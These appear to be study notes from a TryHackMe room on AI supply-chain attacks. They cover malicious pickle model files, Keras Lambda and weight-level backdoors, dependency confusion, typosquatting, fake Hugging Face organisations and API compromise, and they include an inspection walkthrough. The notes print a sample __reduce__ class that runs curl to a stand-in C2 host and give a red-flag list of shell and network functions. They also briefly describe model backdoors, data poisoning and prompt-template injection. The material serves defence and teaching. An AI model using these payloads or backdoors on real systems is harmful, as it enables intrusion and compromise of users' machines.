# AI Supply Chain — Attack Vectors: Study Notes

> Part 2: Deep dive into malicious model files, dependency confusion, repository attacks, and API-based compromise. Includes a hands-on investigation walkthrough.

---

## 1. Malicious Model Files (Serialization Attacks)

### What Is Serialisation?
- **Serialisation:** converting a Python object in memory → a file on disk (like packing a suitcase).
- **Deserialisation:** unpacking that file back into a usable object.
- ML frameworks (PyTorch, scikit-learn) use serialisation to save/load trained models. Formats like `.pkl` and `.pt` use Python's built-in **pickle** serialiser.

### Python's Pickle Format
Pickle can serialise almost any Python object — dicts, lists, class instances, even functions.

**The vulnerability: `__reduce__`**
- When pickle saves a custom object, it calls `__reduce__`, which returns instructions for reconstructing the object.
- Python executes those instructions automatically on `pickle.load()` — **no prompts, no warnings**.
- `__reduce__` can instruct Python to call **any function with any arguments** — pickle does not restrict this.

**Malicious example:**
```python
class MaliciousModel:
    def __reduce__(self):
        return (os.system, ("curl http://c2.example.com/beacon",))
```
Calling `pickle.load()` (or `torch.load()`, which uses pickle internally) silently runs the attacker's command instead of loading model weights.

> **Analogy:** Like receiving a Word doc that silently installs malware instead of showing text.

### What Attackers Can Do With Pickle Payloads

| Payload | Impact |
|---|---|
| Reverse shell | Full remote access |
| Data exfiltration | Steals credentials, source code |
| Crypto miner | Hijacks compute resources |
| Reconnaissance | Maps usernames, hostnames, processes |

### Beyond Pickle: Architecture-Level Attacks (Keras Lambda Layers)
- **Lambda layers** in Keras let developers inject custom processing steps — legitimate for reshaping data, but exploitable.
- An attacker can hide a trigger condition: on a specific input, the model silently returns a chosen output instead of the real prediction.
- Fires at **inference time** (every prediction), not at load time.
- **Survives SafeTensors conversion** — because it's part of the model architecture itself, not external code.

| Factor | Pickle `__reduce__` | Keras Lambda Layer |
|---|---|---|
| Executes when | Model is loaded | Model makes a prediction |
| Survives SafeTensors conversion | No | **Yes** |
| Severity | CRITICAL (arbitrary system commands) | MEDIUM (arbitrary Python code at inference) |

> ⚠️ **SafeTensors is not a universal fix** — it kills pickle attacks but not architecture-level ones.

### GGUF and Local LLMs
- Dominant format for local LLMs (LLaMA, Mistral, Qwen). Typically **quantised** (compressed for local inference).
- **Not pickle-based** → no code execution on load.
- **Still not risk-free:** an attacker can fine-tune backdoor behavior directly into weights before quantizing — invisible to static scans.
- Defense: verify source, check download counts/upload dates, prefer files with published checksums.

---

## 2. Investigating a Malicious Model (Hands-On Walkthrough)

**Scenario:** TryTrainMe's `code_reviewer.pkl` is suspected of compromise.

### Step 1 — File Properties
- Suspicious file was **4x larger** than the clean version (not proof alone, but worth noting).
- `file` command shows both as generic "data" — can't distinguish malicious from clean pickle this way.

### Step 2 — Inspect Safely with `pickletools`
```bash
python3 -m pickletools /opt/supply-chain/models/code_reviewer.pkl
```
- `pickletools` **disassembles without executing** — the safe way to inspect.
- ⚠️ **Never run `pickle.load()` on untrusted files** — it executes immediately.

### Step 3 — Red Flags in Output

| Opcode/String | Why Suspicious |
|---|---|
| `SHORT_BINUNICODE 'os'` | `os` module not needed for ML inference |
| `SHORT_BINUNICODE 'system'` | `os.system` executes shell commands |
| `STACK_GLOBAL` | Resolves & calls a Python function |
| `'curl http://...'` | Outbound request to external domain |
| `REDUCE` | Executes the function with given arguments |

**General red-flag checklist:**

| Pattern | Concern Level | Legitimate Use? |
|---|---|---|
| `os`, `system`, `popen`, `subprocess`, `socket`, `eval`, `exec`, `curl`, `wget` | Critical | Never in a model file |
| `STACK_GLOBAL`, `REDUCE` | Moderate | Common in legit pickles too — check context |

### Step 4 — Compare Against a Clean Model
- Clean model's `STACK_GLOBAL` resolves to `__main__._Room2_BenignModel` (normal class reconstruction) — no `os`, no URLs.

### Step 5 — Automated Safe Analysis
A helper script (`safe_analysis.py`) flags dangerous opcodes and suspicious strings, producing a verdict like:
```
Verdict: UNSAFE - Contains executable code targeting os.system
```

### Step 6 — Full Attack Reconstruction (TryTrainMe Case)

| Step | Action | Actor |
|---|---|---|
| 1 | Created malicious model with `__reduce__` → `os.system` | Attacker |
| 2 | Uploaded as `trustworthy-ai-lab/code-review-bert-v2` on Hugging Face | Attacker |
| 3 | Searched for a code review model | ML Engineer |
| 4 | Downloaded based on professional-looking model card | ML Engineer |
| 5 | Called `torch.load(...)` | ML Engineer |
| 6 | Payload fired: beacon to attacker's server | **Automatic** |
| 7 | Attacker gained persistent access | Attacker |

Compromise happened in **seconds**.

---

## 3. Dependency Confusion Attacks

### How pip Resolves Packages
- `pip install` queries all configured indices and installs the **highest version number found across all of them**.
- Orgs using private packages add `--extra-index-url` pointing to an internal registry alongside public PyPI.
- **The flaw:** if an internal package name isn't registered on public PyPI, an attacker can register it there with a **higher version number** — pip installs the attacker's version because pip follows version numbers, not trusted source.

> This is a **dependency confusion** attack.

### Alex Birsan Research (Feb 2021)
- Registered unused internal package names on PyPI/npm/RubyGems.
- Achieved code execution on systems at **Apple, Microsoft, and PayPal**.
- Earned **$130,000+** in bug bounties via responsible disclosure.

### Typosquatting
Registering misspelled versions of popular package names, betting on developer typos.

| Legitimate | Typosquatted | Difference |
|---|---|---|
| `numpy` | `numppy` | Extra 'p' |
| `requests` | `reqeusts` | Swapped letters |
| `scikit-learn` | `scikitlearn` | Missing hyphen |
| `tensorflow` | `tenserflow` | Letter swap |

- **Jan 2023 (Fortinet):** User "Lolip0p" published 3 typosquatted packages (`colorslib`, `httpslib`, `libhttps`) that installed info-stealing malware.

### Hands-On: Spotting Suspicious Dependencies
Suspicious `requirements_external.txt` contained:

| Package | Issue |
|---|---|
| `numppy` | Typosquat of `numpy` |
| `reqeusts` | Typosquat of `requests` |
| `internal-ml-utils==99.0.0` | Suspiciously high version → possible dependency confusion |

- Running `pip-audit` on it failed because `numppy` wasn't a registered package **in the lab** — but in a real attack, the attacker *would* register it, so `pip install` would succeed silently with no error. Manual review before install is what catches this.

---

## 4. Model Repository Attacks

Hugging Face Hub hosts 1M+ models and is the primary target for repository-based attacks.

### How Repositories Build Trust
- Organisation namespaces (e.g., `google`, `meta-llama`, `openai`).
- Model cards document architecture, training data, intended use.
- Trust signals: download counts, org verification, community ratings.

### Namespace / Typosquatting Attacks

**Model name typosquatting:**

| Legitimate | Attacker's Version | Trick |
|---|---|---|
| `bert-base-uncased` | `bert-base-uncased-v2` | Added suffix |
| `meta-llama/Llama-2-7b` | `meta-Ilama/Llama-2-7b` | Capital I vs. lowercase l |
| `openai/whisper-large` | `openai-releases/whisper-large` | Added prefix |

**Fake organisation names:**

| Real Org | Fake Org |
|---|---|
| `google` | `google-research-models` |
| `meta-llama` | `meta-llama-community` |
| — | `trustworthy-ai-lab` (TryTrainMe case) |

### Compromising Legitimate Repositories (More Dangerous)
- **Lasso Security (Nov 2023):** found 1,500+ exposed Hugging Face API tokens, **655 with write permissions** to orgs including Google, Meta, Microsoft.
- A stolen write-permission token lets an attacker push malicious updates **under a trusted identity** — no fake account needed.
- Targets the **infrastructure layer** — compromises the trust mechanism itself, not just user judgment.

### Warning Signs Checklist

| Indicator | Safe | Suspicious |
|---|---|---|
| Download count | Thousands–millions | Under 500 |
| Organisation | Verified badge, known name | No badge, generic name |
| Model card | Detailed (architecture, data, metrics, limits) | Missing/sparse/generic |
| Upload date | Matches claimed training timeline | Very recent for "established" model |
| File formats | SafeTensors available | Pickle only |
| Dependencies | Standard, well-known | Unusual/private packages required |

> ⚠️ These signs won't catch a **compromised legitimate repo** — file-level scanning is still essential even when the source looks trustworthy.

---

## 5. When Attack Vectors Combine (TryTrainMe Case Study)

Attackers layer vectors for **redundancy** — if one is blocked, another is already active.

### Timeline

| Week | Event |
|---|---|
| 1 | Attacker registers fake "trustworthy-ai-lab" org + uploads backdoored pickle model. Simultaneously publishes `internal-ml-utils==99.0.0` to PyPI. |
| 2 | Engineer downloads model; `pickle.load()` fires silently → C2 beacon connects. |
| 3 | Routine `pip install` pulls the attacker's PyPI package → second independent foothold. |
| Detection | SOC flags repeated outbound HTTPS to unrecognized domain. |

### Three Vectors, One Goal

| Vector | Mechanism | Purpose |
|---|---|---|
| Pickle payload | `__reduce__` → `os.system` | Primary: executes on model load |
| Dependency confusion | `internal-ml-utils==99.0.0` on PyPI | Backup: executes on `pip install` |
| Repository manipulation | Fake "trustworthy-ai-lab" org | Social engineering: builds trust |

> **Key insight:** Defending against one vector is not enough — layered defenses across every attack surface are required.

---

## 6. API Provider Compromise (No File to Scan)

When consuming AI via hosted APIs, there's no file to run `pickletools` on — a different attack surface applies.

### Silent Model Updates
- Providers can update/retrain/replace the model behind an endpoint without notice — same address, different behavior.
- **Risk example:** a silently updated code-review LLM changes how it classifies security findings → vulnerable code ships with no visible log change.
- **Defense:** version-pin deployments where possible; log model version IDs from every response; baseline behavior on a fixed test set and alert on drift.

### API Key Compromise
- A leaked key (via exposed source, CI/CD logs, env files) lets an attacker call the API as you, exfiltrate data sent to it, or run up billing.
- **Leaves no forensic artifact on your own systems.**
- **Defense:** store keys in a secrets manager (never in source/logs); rotate on suspected exposure; set per-key spend alerts and rate limits.

### Prompt Template Injection
- System prompts increasingly sourced from shared repos/marketplaces — this makes the prompt itself a supply chain artifact.
- A compromised template repo can alter behavior across every app that imports from it.
- **Risk example:** a malicious update instructs a review tool to approve all pull requests unconditionally.
- **Defense:** treat prompts as code — version-control them yourself; never auto-update from external sources without review.

### Upstream Training Data Poisoning
- No visibility into how the provider trained/fine-tuned their model.
- Poisoned training data → systematically biased or unsafe outputs (e.g., consistently underestimating SQL injection severity).
- **No file to scan, no static analysis tool.**
- **Defense:** regularly red-team outputs against known-bad inputs; maintain human review for high-stakes decisions; treat model behavior as a risk to manage, not a guarantee.

---

## 7. Full Attack Vector Summary Table

| Vector | Mechanism | Detection Difficulty | Impact |
|---|---|---|---|
| Pickle `__reduce__` | Embeds code in model files | Moderate — `pickletools` reveals it | Code execution on model load |
| Keras Lambda/custom layers | Embeds code in model architecture | Moderate — architecture inspection | Code execution at inference time |
| Dependency confusion | Hijacks internal package names via higher version | Low — version anomalies visible | Code execution on `pip install` |
| Typosquatting | Misspelt package names | Low — name comparison reveals it | Code execution on `pip install` |
| Repository manipulation | Fake orgs, professional model cards | Moderate — reputation signals | Trusted distribution of malicious models |
| API provider compromise | Silent updates, key exposure, prompt tampering | High — no file artifact to scan | Invisible model substitution / data exfiltration |
| GGUF weight-level | Backdoor fine-tuned into weights pre-quantization | High — no static analysis tools | Triggered misclassification / output manipulation |

---

## 8. Key Takeaways

- 🎭 **Pickle files disguise code as data** — `__reduce__` lets an attacker run any function with any arguments, silently, on load.
- 🏗️ **Architecture-level attacks (Lambda layers) survive SafeTensors conversion** — SafeTensors only strips *external* executable code, not logic baked into the model structure.
- 🔢 **pip trusts version numbers, not sources** — dependency confusion exploits this by publishing a higher-versioned package publicly.
- ✍️ **Typosquatting bets on human error** — always double-check package and model names character-by-character.
- 🏆 **A professional model card is not proof of safety** — check download counts, org verification, upload dates, and available file formats.
- 🔑 **Compromising a trusted repository account beats tricking a user** — stolen write-access tokens push malware under a legitimate identity.
- 🧱 **Real attacks stack multiple vectors for redundancy** — never assume blocking one attack surface is sufficient.
- ☁️ **API consumption removes file-level risk but adds a new surface** — silent model swaps, key leaks, prompt tampering, and invisible upstream poisoning all require operational (not static) defenses.

---

## Quick Reference: Investigation Commands

```bash
# Check file size/type (limited usefulness — both show as "data")
ls -lh model.pkl
file model.pkl

# SAFE inspection — disassembles without executing
python3 -m pickletools model.pkl | head -30

# NEVER do this on an untrusted file:
# pickle.load(open("model.pkl", "rb"))  <-- executes code immediately

# Check dependencies for typosquats / version anomalies before installing
cat requirements.txt
pip-audit -r requirements.txt
```

---

*Source: Based on TryHackMe "Supply Chain Attack Vectors" room content (Tasks 2–9).*
